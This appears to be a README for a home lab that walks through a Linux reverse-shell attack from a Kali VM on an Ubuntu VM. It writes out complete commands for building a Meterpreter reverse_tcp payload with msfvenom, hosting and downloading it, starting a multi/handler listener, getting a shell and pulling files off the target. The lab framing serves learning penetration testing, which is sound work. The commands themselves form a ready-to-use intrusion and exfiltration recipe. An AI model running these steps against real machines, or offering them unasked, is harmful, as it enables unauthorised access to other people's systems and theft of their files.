# Linux-Reverse-Shell-File-Transfer-Lab
Project Overview

This project demonstrates a controlled penetration testing scenario using Kali Linux as an attacker and Ubuntu Linux as a target. The main goal is to create a Linux reverse shell payload, execute it on the Ubuntu VM, and gain controlled access to explore and transfer files — mimicking real-world penetration testing steps.

⚠️ Note: This is done in a safe, isolated lab environment for learning purposes only.

Tools Used

Kali Linux – Attacker machine

Ubuntu Linux – Target machine

Metasploit Framework (msfvenom, msfconsole)

Python3 HTTP server (python3 -m http.server)

Scrot – Linux screenshot tool

Basic Linux commands for file exploration

Step-by-Step Workflow
Step 1: Prepare Kali (Attacker)

Navigate to your working folder:

cd ~/Desktop


Create a Linux reverse shell payload with Metasploit:

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.16.127 LPORT=4444 -f elf > reverse.elf


LHOST = Kali IP address

LPORT = port to listen for connection

-f elf = ELF binary format (Linux executable)

Serve the payload via HTTP so the target Ubuntu can download it:

python3 -m http.server 8080

Step 2: Setup Ubuntu (Target)

Navigate to Desktop (or desired folder):

cd ~/Desktop


Download the payload from Kali:

wget http://192.168.16.127:8080/reverse.elf


Make it executable:

chmod +x reverse.elf


(Optional) Install screenshot tool:

sudo apt update && sudo apt install scrot -y

Step 3: Start Meterpreter Listener (Kali)

Open Metasploit console:

msfconsole


Configure a multi-handler for the reverse shell:

use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.16.127
set LPORT 4444
exploit

Step 4: Execute Payload on Ubuntu
./reverse.elf


Kali should now show:

[*] Meterpreter session 1 opened ...
meterpreter >


✅ This confirms successful reverse shell connection.

Step 5: Explore Target System

From the Meterpreter session:

Check system info:

sysinfo


List files in current folder:

ls


Optional: upgrade to normal Linux shell:

shell
whoami


This gives a standard bash shell on Ubuntu.

Step 6: Take Screenshot on Ubuntu

From the Ubuntu shell:

scrot ~/Desktop/screenshot.png


Screenshot saved on Ubuntu Desktop.

Step 7: Transfer Files to Kali

From Meterpreter:

download /home/ubuntu/Desktop/screenshot.png /home/kali/Desktop/screenshot.png
download /home/ubuntu/Desktop/ossec.conf /home/kali/Desktop/ossec.conf


Use absolute paths to avoid errors.

✅ This demonstrates controlled file exfiltration from a target machine.

Step 8: Background Meterpreter Session (Optional)
background


Allows running multiple sessions without closing the current one.

Commands Summary
Task	Command
Create payload	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.16.127 LPORT=4444 -f elf > reverse.elf
Serve payload	python3 -m http.server 8080
Download payload	wget http://192.168.16.127:8080/reverse.elf
Make executable	chmod +x reverse.elf
Install scrot	sudo apt install scrot -y
Start Metasploit	msfconsole
Configure handler	use exploit/multi/handler
Set payload	set payload linux/x86/meterpreter/reverse_tcp
Set LHOST	set LHOST 192.168.16.127
Set LPORT	set LPORT 4444
Start listener	exploit
Upgrade shell	shell
Check user	whoami
Take screenshot	scrot ~/Desktop/screenshot.png
Download files	download /path/to/file /local/path
Background session	background
Diagram: Kali ↔ Ubuntu Flow
+----------------+                  +------------------+
|     Kali       |  Serve Payload    |      Ubuntu      |
|  Attacker VM   |-----------------> |  Victim VM       |
|                |  (reverse.elf)    |                  |
+----------------+                  +------------------+
        |                                   |
        | Open listener                     | Execute payload
        |                                   | ./reverse.elf
        v                                   v
+----------------+                  +------------------+
| Meterpreter    |<-----------------|  Reverse Shell   |
| session opens  |   Reverse TCP     |   established    |
| (Kali terminal)|                  | (Ubuntu terminal)|
+----------------+                  +------------------+
        |
        | Download files (screenshots, configs)
        v
+----------------+
| Kali Desktop   |
| Files saved    |
+----------------+

Learning Outcomes

How to create and execute Linux reverse shell payloads.

Gain controlled Meterpreter sessions on Linux targets.

Explore Linux filesystem and transfer files securely.

Practical understanding of penetration testing workflow.
